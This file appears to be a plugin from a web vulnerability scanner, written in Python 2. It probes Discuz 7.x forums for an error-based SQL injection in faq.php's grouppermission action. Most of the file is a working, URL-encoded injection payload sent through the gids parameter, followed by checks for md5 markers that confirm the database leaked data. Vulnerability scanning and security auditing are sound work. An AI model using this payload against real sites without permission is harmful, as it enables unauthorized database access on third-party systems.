#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *


def run_domain(http,ob):
    list = []
    try:
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20%28select%20%28select%20concat%28md5(333),0x27,md5(444)%29%20from%20information_schema.SCHEMATA%20limit%201%29%20%29%20from%20%60information_schema%60.tables%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        resulturl="%s%s"%(url,expurl)
        res, content = requestUrl(http,resulturl,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0 and content.find('550a141f12de6341fba65b0ad043350')>=0:            
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
        else:
            resulturl="%sbbs/%s"%(url,expurl)
            res, content = requestUrl(http,resulturl,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and content.find('310dcbbf4cce62f762a2aaa148d556bd')>=0 and content.find('550a141f12de6341fba65b0ad043350')>=0:            
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
            
            
            
    except Exception,e:
        logging.getLogger().error("File:Discuz7X_SqlinjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Discuz7X_SqlinjectionScript.py, run_domain function :" + str(e))
    #end try

    return list
#end def
